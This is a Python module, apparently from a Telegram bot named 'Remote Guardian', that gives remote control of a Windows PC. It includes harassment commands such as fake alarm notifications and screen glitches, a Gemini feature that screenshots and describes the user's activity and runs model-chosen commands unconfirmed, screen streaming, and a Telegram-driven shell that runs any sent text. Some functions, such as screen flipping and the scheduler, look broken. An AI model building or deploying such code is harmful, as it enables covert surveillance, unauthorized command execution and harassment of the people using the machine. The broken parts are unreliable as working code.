"""
Продвинутые функции Remote Guardian V12:
- Управление окнами
- Планировщик задач
- VNC-режим (стриминг экрана)
- Reverse Shell (интерактивный терминал)
"""

import os
import asyncio
import time
import psutil
import pyautogui
from datetime import datetime, timedelta
from telethon import events
from core.decorators import with_verify
from core.state import state
from config import MAIN_ADMINS, BASE_DIR
from utils.helpers import safe_remove

def register_advanced(bot):
    """Регистрация продвинутых команд."""
    
    # ===== 0. ТРОЛИНГ ФУНКЦИИ =====
    
    @bot.on(events.NewMessage(pattern=r'^/flip$'))
    @with_verify("Flip Screen", dangerous=True)
    async def flip_screen(event):
        """Перевернуть экран вверх ногами."""
        import subprocess
        try:
            # Поворот на 180 градусов (вверх ногами)
            subprocess.run(['DisplaySwitch.exe', '/internal'], shell=True)
            # Используем встроенную Windows функцию
            os.system('powershell -command "Set-DisplayOrientation -Orientation Flipped"')
            await event.reply("🔄 Экран перевёрнут! Для возврата: `/flip` снова")
        except:
            # Альтернативный метод через graphics drivers
            await asyncio.to_thread(os.system, 'DisplaySwitch.exe /clone')
            await event.reply("🔄 Попытка перевернуть экран...")
    
    @bot.on(events.NewMessage(pattern=r'^/shake(?: (\d+))?$'))
    @with_verify("Shake Mouse", dangerous=True)
    async def shake_mouse(event):
        """Трясти курсор мыши."""
        import random
        duration = int(event.pattern_match.group(1)) if event.pattern_match.group(1) else 10
        
        if duration > 60:
            return await event.reply("❌ Максимум 60 секунд!")
        
        await event.reply(f"🐭 Трясу курсор {duration} секунд...")
        
        def shake():
            import pyautogui
            end_time = time.time() + duration
            original_pos = pyautogui.position()
            
            while time.time() < end_time:
                x_offset = random.randint(-50, 50)
                y_offset = random.randint(-50, 50)
                new_x = max(0, original_pos.x + x_offset)
                new_y = max(0, original_pos.y + y_offset)
                pyautogui.moveTo(new_x, new_y, duration=0.1)
                time.sleep(0.1)
            
            # Вернуть на место
            pyautogui.moveTo(original_pos.x, original_pos.y)
        
        await asyncio.to_thread(shake)
        await event.reply("✅ Тряска завершена!")
    
    @bot.on(events.NewMessage(pattern=r'^/glitch(?: (\d+))?$'))
    @with_verify("Glitch Screen", dangerous=True)
    async def glitch_screen(event):
        """Артефакты на экране."""
        import random
        from PIL import Image, ImageDraw
        duration = int(event.pattern_match.group(1)) if event.pattern_match.group(1) else 5
        
        if duration > 30:
            return await event.reply("❌ Максимум 30 секунд!")
        
        await event.reply(f"📺 Глитч на {duration} секунд...")
        
        def create_glitch():
            import pyautogui
            import win32gui
            import win32ui
            import win32con
            
            end_time = time.time() + duration
            
            while time.time() < end_time:
                # Случайные окна с артефактами
                hwnd = win32gui.GetDesktopWindow()
                hdc = win32gui.GetWindowDC(hwnd)
                
                for _ in range(5):
                    x = random.randint(0, 1920)
                    y = random.randint(0, 1080)
                    width = random.randint(50, 200)
                    height = random.randint(50, 200)
                    
                    # Рисуем случайные прямоугольники
                    color = random.randint(0, 0xFFFFFF)
                    brush = win32gui.CreateSolidBrush(color)
                    win32gui.FillRect(hdc, (x, y, x+width, y+height), brush)
                    win32gui.DeleteObject(brush)
                
                win32gui.ReleaseDC(hwnd, hdc)
                time.sleep(0.2)
        
        try:
            await asyncio.to_thread(create_glitch)
            await event.reply("✅ Глитч завершён!")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}\n\nПопробуй установить `pywin32`")
    
    @bot.on(events.NewMessage(pattern=r'^/rickroll$'))
    @with_verify("Rickroll", dangerous=True)
    async def rickroll(event):
        """Rick Astley в полноэкранном режиме."""
        import webbrowser
        import pyautogui
        
        await event.reply("🎵 Never gonna give you up... 🕺")
        
        # Открываем Rick Astley на YouTube
        webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
        
        # Ждём загрузки страницы
        await asyncio.sleep(3)
        
        # Нажимаем F для полноэкранного режима
        pyautogui.press('f')
        
        await event.reply("😎 You just got Rickrolled!")
    
    @bot.on(events.NewMessage(pattern=r'^/crazy$'))
    @with_verify("Crazy Mode", dangerous=True)
    async def crazy_mode(event):
        """Безумный режим — всё сразу!"""
        await event.reply("🤪 CRAZY MODE ACTIVATED!")
        
        def go_crazy():
            import random
            import win32gui
            import win32con
            
            # 10 секунд безумия
            end_time = time.time() + 10
            
            while time.time() < end_time:
                # Случайное действие
                action = random.choice(['shake', 'beep', 'flash'])
                
                if action == 'shake':
                    # Трясём курсор
                    x, y = pyautogui.position()
                    pyautogui.moveTo(x + random.randint(-100, 100), y + random.randint(-100, 100), duration=0.1)
                
                elif action == 'beep':
                    # Системный звук
                    import winsound
                    winsound.Beep(random.randint(200, 2000), 100)
                
                elif action == 'flash':
                    # Мигание окон
                    hwnd = win32gui.GetDesktopWindow()
                    win32gui.FlashWindow(hwnd, True)
                
                time.sleep(0.2)
        
        try:
            await asyncio.to_thread(go_crazy)
            await event.reply("✅ Безумие завершено!")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
    
    @bot.on(events.NewMessage(pattern=r'^/spam(?: (.+))?$'))
    @with_verify("Spam Notifications", dangerous=True)
    async def spam_notifications(event):
        """Спам Windows-уведомлениями."""
        text = event.pattern_match.group(1) or "ВНИМАНИЕ! ВАЖНОЕ СООБЩЕНИЕ!"
        
        await event.reply("📢 Запускаю спам уведомлений (10 шт)...")
        
        def spam():
            from win10toast import ToastNotifier
            toaster = ToastNotifier()
            
            messages = [
                "⚠️ КРИТИЧЕСКАЯ ОШИБКА!",
                "🚨 ВНИМАНИЕ!",
                "❗ ВАЖНОЕ УВЕДОМЛЕНИЕ!",
                text,
                "💥 СРОЧНО!",
                "🔴 ПРЕДУПРЕЖДЕНИЕ!",
                "⚡ ALERT!",
                "🎯 ЧИТАЙ МЕНЯ!",
                "🔔 НЕ ПРОПУСТИ!",
                "📣 ПОСЛЕДНЕЕ ПРЕДУПРЕЖДЕНИЕ!"
            ]
            
            for msg in messages:
                toaster.show_toast("Remote Guardian", msg, duration=3, threaded=True)
                time.sleep(0.5)
        
        try:
            await asyncio.to_thread(spam)
            await event.reply("✅ Спам отправлен!")
        except ImportError:
            await event.reply("❌ Установи: `pip install win10toast`")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
    
    @bot.on(events.NewMessage(pattern=r'^/matrix$'))
    @with_verify("Matrix Effect", dangerous=True)
    async def matrix_effect(event):
        """Эффект Матрицы в терминале."""
        await event.reply("🟢 Запускаю эффект Матрицы...")
        
        def show_matrix():
            import subprocess
            # Открываем CMD и запускаем матрицу
            cmd = 'color 0a & mode con: cols=80 lines=25 & echo off & cls & for /L %i in (1,1,1000) do @echo %RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%'
            subprocess.Popen(['cmd', '/c', cmd], creationflags=subprocess.CREATE_NEW_CONSOLE)
        
        await asyncio.to_thread(show_matrix)
        await event.reply("🟢 Matrix запущен! Закрой окно CMD чтобы остановить.")
    
    # ===== AI ИНТЕГРАЦИЯ (Google Gemini - БЕСПЛАТНО!) =====
    
    @bot.on(events.NewMessage(pattern=r'^/ask (.+)'))
    @with_verify("Ask AI Agent", dangerous=False)
    async def ask_ai_agent(event):
        """Спросить Google Gemini о системе."""
        question = event.pattern_match.group(1)
        
        # Специальная обработка для вопросов про любовь к Рамазану 😏
        love_keywords = ['любит', 'люблю', 'любовь', 'нравлюсь', 'нравится', 'рамазан']
        if any(keyword in question.lower() for keyword in love_keywords):
            import random
            compliments = [
                "Конечно любит! Ты же невероятная! ✨",
                "Да, безусловно! Ты самая прекрасная! 💖",
                "100%! Ты же богиня! 👑",
                "Безумно любит! Ты же сияешь как звезда! ⭐",
                "Ещё как! Ты просто волшебная! ✨💕",
                "Да! Ты же идеальна во всём! 💯",
                "Конечно! Ты украшаешь этот мир! 🌸",
                "Да, и он счастливчик! Ты великолепна! 😍"
            ]
            return await event.reply(f"💕 {random.choice(compliments)}")
        
        # Автоматическое определение: нужен ли скриншот для ответа
        screen_keywords = [
            'вижу', 'видишь', 'экран', 'делаю', 'делаешь', 'открыт', 
            'что на экране', 'что происходит', 'покажи', 'смотрю',
            'работаю', 'программа', 'приложение', 'окно', 'браузер'
        ]
        need_screenshot = any(keyword in question.lower() for keyword in screen_keywords)
        
        # Проверяем наличие API ключа в .env
        import os
        api_key = os.getenv('GEMINI_API_KEY')
        
        if not api_key:
            return await event.reply(
                "❌ Google Gemini API ключ не настроен!\n\n"
                "**Как получить (БЕСПЛАТНО):**\n"
                "1. Зайди на https://makersuite.google.com/app/apikey\n"
                "2. Создай API ключ\n"
                "3. Добавь в `.env`:\n"
                "`GEMINI_API_KEY=твой_ключ`\n\n"
                "4. Установи: `pip install google-generativeai`"
            )
        
        msg = await event.reply("🤖 Думаю...")
        
        try:
            import google.generativeai as genai
            import platform
            import re
            
            genai.configure(api_key=api_key)
            model = genai.GenerativeModel('gemini-2.5-flash-lite')
            
            # Собираем информацию о системе
            cpu = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory().percent
            disk = psutil.disk_usage('C:\\').percent
            
            # Если вопрос требует визуального анализа — делаем скриншот
            screenshot = None
            if need_screenshot:
                await msg.edit("🤖 Делаю скриншот для анализа...")
                screenshot = pyautogui.screenshot()
            
            # Список команд для AI
            available_commands = """
📋 Доступные команды бота (ты можешь их использовать):
• /screenshot — скриншот экрана
• /sysinfo — детальная информация о системе
• /temp — температуры CPU/GPU
• /ps — список процессов
• /disk — использование дисков
• /windows — открытые окна
• /vnc start — запустить стриминг экрана
• /vnc stop — остановить стриминг
• /shutdown — выключить ПК
• /restart — перезагрузить ПК
• /lock — заблокировать экран

Если пользователь просит выполнить действие — добавь в конец ответа:
[COMMAND:команда]

Пример: "Делаю скриншот! [COMMAND:/screenshot]"
Можно несколько команд: [COMMAND:/screenshot] [COMMAND:/ps]
"""
            
            # Формируем промпт в зависимости от наличия скриншота
            if screenshot:
                # Запрос с анализом экрана
                prompt_parts = [
                    f"Ты AI-ассистент для удалённого управления Windows ПК. Отвечай на русском.\n\n"
                    f"{available_commands}\n\n"
                    f"Система: {platform.system()} {platform.release()}\n"
                    f"CPU: {cpu}% | RAM: {mem}% | Диск: {disk}%\n\n"
                    f"Пользователь спросил: {question}\n\n"
                    f"Вот скриншот его экрана. Проанализируй что он делает и ответь на вопрос:",
                    screenshot
                ]
                response = await asyncio.to_thread(model.generate_content, prompt_parts)
            else:
                # Обычный запрос без скриншота
                prompt = (
                    f"Ты AI-ассистент для удалённого управления Windows ПК.\n\n"
                    f"{available_commands}\n\n"
                    f"Текущее состояние системы:\n"
                    f"• ОС: {platform.system()} {platform.release()}\n"
                    f"• Процессор: {platform.processor()}\n"
                    f"• CPU: {cpu}% | RAM: {mem}% | Диск C: {disk}%\n\n"
                    f"Запрос пользователя: {question}\n\n"
                    f"Ответь на русском. Если нужно выполнить команду — добавь [COMMAND:команда]"
                )
                response = await asyncio.to_thread(model.generate_content, prompt)
            answer = response.text
            
            # Парсим команды из ответа
            commands = re.findall(r'\[COMMAND:(/[a-z\s]+)\]', answer)
            
            # Убираем теги команд из текста для чистого отображения
            clean_answer = re.sub(r'\[COMMAND:/[a-z\s]+\]', '', answer).strip()
            
            # Отправляем ответ Gemini
            await msg.edit(f"🤖 **Gemini AI:**\n\n{clean_answer}")
            
            # Выполняем найденные команды
            if commands:
                for cmd in commands:
                    cmd = cmd.strip()
                    await asyncio.sleep(0.5)
                    await event.reply(f"⚙️ Выполняю: `{cmd}`")
                    
                    # Выполняем команды напрямую
                    if cmd == '/screenshot':
                        screenshot = pyautogui.screenshot()
                        ss_path = os.path.join(BASE_DIR, 'ai_screenshot.png')
                        screenshot.save(ss_path)
                        await event.reply("📸 Скриншот:", file=ss_path)
                        safe_remove(ss_path)
                    
                    elif cmd == '/sysinfo':
                        from datetime import timedelta
                        uptime = str(timedelta(seconds=int(time.time() - psutil.boot_time())))
                        await event.reply(
                            f"🖥 **Информация о системе:**\n\n"
                            f"**💻 ОС:** {platform.system()} {platform.release()}\n"
                            f"**⚙️ CPU:** {platform.processor()}\n"
                            f"└ Загрузка: {cpu}%\n\n"
                            f"**💾 RAM:** {mem}%\n"
                            f"**💿 Диск C:** {disk}%\n"
                            f"**⏱ Uptime:** {uptime}"
                        )
                    
                    elif cmd == '/ps':
                        procs = [p.info['name'] for p in psutil.process_iter(['name'])][:15]
                        await event.reply(f"📋 **Топ-15 процессов:**\n\n" + '\n'.join(f"• {p}" for p in procs))
                    
                    elif cmd == '/disk':
                        msg_disk = "💿 **Диски:**\n\n"
                        for p in psutil.disk_partitions():
                            try:
                                u = psutil.disk_usage(p.mountpoint)
                                msg_disk += f"**{p.device}** {u.used/(1024**3):.1f}/{u.total/(1024**3):.1f} GB ({u.percent}%)\n"
                            except:
                                pass
                        await event.reply(msg_disk)
                    
                    else:
                        # Для остальных команд отправляем как текст (бот обработает сам)
                        await bot.send_message(event.sender_id, cmd)
        
        except ImportError:
            await msg.edit(
                "❌ Библиотека не установлена\n\n"
                "Установи: `pip install google-generativeai`"
            )
        except Exception as e:
            await msg.edit(f"❌ Ошибка: {e}")
    
    @bot.on(events.NewMessage(pattern=r'^/analyze$'))
    @with_verify("Analyze Screenshot", dangerous=False)
    async def analyze_screen(event):
        """Google Gemini Vision анализирует скриншот."""
        import os
        api_key = os.getenv('GEMINI_API_KEY')
        
        if not api_key:
            return await event.reply(
                "❌ Google Gemini API ключ не настроен!\n\n"
                "Получи бесплатный ключ: https://makersuite.google.com/app/apikey"
            )
        
        msg = await event.reply("📸 Делаю скриншот и анализирую...")
        
        try:
            import google.generativeai as genai
            from PIL import Image
            
            genai.configure(api_key=api_key)
            # Используем актуальную модель Gemini 2.5
            model = genai.GenerativeModel('gemini-2.5-flash-lite')
            
            # Делаем скриншот
            screenshot = pyautogui.screenshot()
            
            # Запрос к Gemini Vision
            response = await asyncio.to_thread(
                model.generate_content,
                [
                    "Проанализируй этот скриншот экрана компьютера. "
                    "Опиши что видишь: какие программы открыты, что делает пользователь, "
                    "что происходит на экране. Отвечай на русском подробно.",
                    screenshot
                ]
            )
            
            analysis = response.text
            await msg.edit(f"🔍 **Анализ экрана (Gemini Vision):**\n\n{analysis}")
        
        except ImportError:
            await msg.edit(
                "❌ Библиотека не установлена\n\n"
                "Установи: `pip install google-generativeai pillow`"
            )
        except Exception as e:
            await msg.edit(f"❌ Ошибка: {e}")
    
    # ===== 1. УПРАВЛЕНИЕ ОКНАМИ =====
    
    @bot.on(events.NewMessage(pattern=r'^/windows$'))
    @with_verify("List Windows", dangerous=False)
    async def list_windows(event):
        """Список всех открытых окон."""
        try:
            import win32gui
            
            def callback(hwnd, windows):
                if win32gui.IsWindowVisible(hwnd):
                    title = win32gui.GetWindowText(hwnd)
                    if title:
                        windows.append((hwnd, title))
                return True
            
            windows = []
            win32gui.EnumWindows(callback, windows)
            
            msg = "🪟 **Открытые окна:**\n\n"
            for i, (hwnd, title) in enumerate(windows[:20], 1):  # Топ-20
                msg += f"`{i}.` {title}\n"
            
            if not windows:
                msg += "Нет открытых окон"
            
            await event.reply(msg)
        except ImportError:
            await event.reply("❌ Библиотека `pywin32` не установлена\nУстанови: `pip install pywin32`")
    
    @bot.on(events.NewMessage(pattern=r'^/close (.+)'))
    @with_verify("Close Window", dangerous=True)
    async def close_window(event):
        """Закрыть окно по названию."""
        window_name = event.pattern_match.group(1)
        try:
            import win32gui
            import win32con
            
            def callback(hwnd, name):
                if name.lower() in win32gui.GetWindowText(hwnd).lower():
                    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                return True
            
            win32gui.EnumWindows(callback, window_name)
            await event.reply(f"✅ Попытка закрыть окна содержащие: `{window_name}`")
        except ImportError:
            await event.reply("❌ Библиотека `pywin32` не установлена")
    
    # ===== 2. ПЛАНИРОВЩИК ЗАДАЧ =====
    
    if not hasattr(state, 'scheduled_tasks'):
        state.scheduled_tasks = {}
        state.task_id_counter = 0
    
    @bot.on(events.NewMessage(pattern=r'^/schedule (\d{1,2}):(\d{2}) (.+)'))
    @with_verify("Schedule Task", dangerous=True)
    async def schedule_task(event):
        """Запланировать команду на определённое время."""
        hour = int(event.pattern_match.group(1))
        minute = int(event.pattern_match.group(2))
        command = event.pattern_match.group(3)
        
        if hour > 23 or minute > 59:
            return await event.reply("❌ Неверное время! Формат: HH:MM (24ч)")
        
        now = datetime.now()
        target_time = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
        
        # Если время уже прошло сегодня — планируем на завтра
        if target_time < now:
            target_time += timedelta(days=1)
        
        delay = (target_time - now).total_seconds()
        
        async def execute_scheduled():
            await asyncio.sleep(delay)
            # Эмулируем отправку команды от пользователя
            from telethon.tl.types import Message
            fake_msg = Message(
                id=0,
                peer_id=event.peer_id,
                message=command,
                date=datetime.now()
            )
            fake_msg.sender_id = event.sender_id
            
            # Отправляем команду боту
            await bot.send_message(event.sender_id, f"⏰ Выполняю задачу: `{command}`")
            # Симулируем обработку команды
            await bot.send_message(event.sender_id, command)
            
            # Удаляем из списка задач
            if task_id in state.scheduled_tasks:
                del state.scheduled_tasks[task_id]
        
        state.task_id_counter += 1
        task_id = state.task_id_counter
        
        task = asyncio.create_task(execute_scheduled())
        state.scheduled_tasks[task_id] = {
            'task': task,
            'time': target_time.strftime('%H:%M'),
            'command': command
        }
        
        await event.reply(
            f"✅ Задача запланирована!\n\n"
            f"**ID:** {task_id}\n"
            f"**Время:** {target_time.strftime('%H:%M')}\n"
            f"**Команда:** `{command}`\n\n"
            f"Отменить: `/cancel {task_id}`"
        )
    
    @bot.on(events.NewMessage(pattern=r'^/tasks$'))
    @with_verify("List Tasks", dangerous=False)
    async def list_tasks(event):
        """Список запланированных задач."""
        if not state.scheduled_tasks:
            return await event.reply("📭 Нет запланированных задач")
        
        msg = "📋 **Запланированные задачи:**\n\n"
        for task_id, task_info in state.scheduled_tasks.items():
            msg += (
                f"**ID {task_id}:**\n"
                f"└ Время: {task_info['time']}\n"
                f"└ Команда: `{task_info['command']}`\n\n"
            )
        
        await event.reply(msg)
    
    @bot.on(events.NewMessage(pattern=r'^/cancel (\d+)'))
    @with_verify("Cancel Task", dangerous=False)
    async def cancel_task(event):
        """Отменить запланированную задачу."""
        task_id = int(event.pattern_match.group(1))
        
        if task_id not in state.scheduled_tasks:
            return await event.reply(f"❌ Задача #{task_id} не найдена")
        
        task_info = state.scheduled_tasks[task_id]
        task_info['task'].cancel()
        del state.scheduled_tasks[task_id]
        
        await event.reply(f"✅ Задача #{task_id} отменена")
    
    # ===== 3. VNC-РЕЖИМ (Стриминг экрана) =====
    
    if not hasattr(state, 'vnc_active'):
        state.vnc_active = False
        state.vnc_task = None
    
    @bot.on(events.NewMessage(pattern=r'^/vnc (start|stop)'))
    @with_verify("VNC Mode", dangerous=True)
    async def vnc_mode(event):
        """VNC-режим: стриминг экрана."""
        mode = event.pattern_match.group(1)
        
        if mode == 'start':
            if state.vnc_active:
                return await event.reply("🖥 VNC уже активен!")
            
            state.vnc_active = True
            
            async def stream_screen():
                import pyautogui
                import io
                
                while state.vnc_active:
                    try:
                        screenshot = pyautogui.screenshot()
                        # Сжимаем до 800px ширины для быстрой отправки
                        screenshot.thumbnail((800, 600))
                        
                        # Конвертируем в байты
                        img_bytes = io.BytesIO()
                        screenshot.save(img_bytes, format='JPEG', quality=60)
                        img_bytes.seek(0)
                        
                        await bot.send_file(event.sender_id, img_bytes, caption="🖥 VNC Stream")
                        await asyncio.sleep(2)  # 1 кадр каждые 2 секунды
                    except Exception as e:
                        await bot.send_message(event.sender_id, f"❌ Ошибка VNC: {e}")
                        state.vnc_active = False
                        break
            
            state.vnc_task = asyncio.create_task(stream_screen())
            await event.reply("🖥 VNC-режим запущен! Получаешь скриншоты каждые 2 сек.\n\nОстановить: `/vnc stop`")
        
        else:  # stop
            if not state.vnc_active:
                return await event.reply("🖥 VNC не активен")
            
            state.vnc_active = False
            if state.vnc_task:
                state.vnc_task.cancel()
            await event.reply("🛑 VNC-режим остановлен")
    
    # ===== 4. REVERSE SHELL (Интерактивный терминал) =====
    
    if not hasattr(state, 'shell_sessions'):
        state.shell_sessions = {}
    
    @bot.on(events.NewMessage(pattern=r'^/shell$'))
    @with_verify("Interactive Shell", dangerous=True)
    async def start_shell(event):
        """Запуск интерактивного терминала."""
        user_id = event.sender_id
        
        if user_id in state.shell_sessions:
            return await event.reply(
                "💻 Терминал уже запущен!\n\n"
                "Просто отправляй команды (без `/shell`).\n"
                "Выход: `/shell exit`"
            )
        
        # Создаём интерактивную сессию
        state.shell_sessions[user_id] = {
            'cwd': os.getcwd(),
            'env': os.environ.copy()
        }
        
        await event.reply(
            "💻 **Интерактивный терминал запущен!**\n\n"
            f"📁 Текущая директория: `{os.getcwd()}`\n\n"
            "Просто отправляй команды:\n"
            "• `cd <путь>` — сменить директорию\n"
            "• `pwd` — текущий путь\n"
            "• `/shell exit` — выход\n\n"
            "Все команды выполняются в этой сессии."
        )
    
    @bot.on(events.NewMessage(pattern=r'^/shell exit$'))
    @with_verify("Exit Shell", dangerous=False)
    async def exit_shell(event):
        """Выход из терминала."""
        user_id = event.sender_id
        
        if user_id not in state.shell_sessions:
            return await event.reply("❌ Терминал не запущен")
        
        del state.shell_sessions[user_id]
        await event.reply("✅ Терминал закрыт")
    
    @bot.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
    async def shell_command_handler(event):
        """Обработчик команд для интерактивного терминала."""
        user_id = event.sender_id
        
        # Проверяем, активна ли сессия
        if user_id not in state.shell_sessions:
            return  # Не наша команда
        
        # Проверяем, что это не другая команда бота
        if event.text.startswith('/') and event.text != '/shell exit':
            return  # Пропускаем команды бота
        
        session = state.shell_sessions[user_id]
        cmd = event.text.strip()
        
        # Обработка cd
        if cmd.startswith('cd '):
            path = cmd[3:].strip()
            try:
                if os.path.isabs(path):
                    new_cwd = path
                else:
                    new_cwd = os.path.join(session['cwd'], path)
                
                if os.path.isdir(new_cwd):
                    session['cwd'] = os.path.abspath(new_cwd)
                    await event.reply(f"📁 `{session['cwd']}`")
                else:
                    await event.reply(f"❌ Директория не найдена: `{path}`")
            except Exception as e:
                await event.reply(f"❌ Ошибка: {e}")
            return
        
        # pwd
        if cmd == 'pwd':
            await event.reply(f"📁 `{session['cwd']}`")
            return
        
        # Выполнение команды в текущей директории
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=session['cwd'],
                env=session['env']
            )
            
            out, err = await asyncio.wait_for(proc.communicate(), timeout=60.0)
            result = (out + err).decode('cp866', errors='replace')
            
            if len(result) > 4000:
                fp = os.path.join(BASE_DIR, 'shell_output.txt')
                with open(fp, 'w', encoding='utf-8') as f:
                    f.write(result)
                await event.reply("📁 Результат:", file=fp)
                safe_remove(fp)
            else:
                await event.reply(f"```text\n{result or 'OK'}\n```")
        
        except asyncio.TimeoutError:
            await event.reply("⏱ Таймаут команды (60 сек)")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
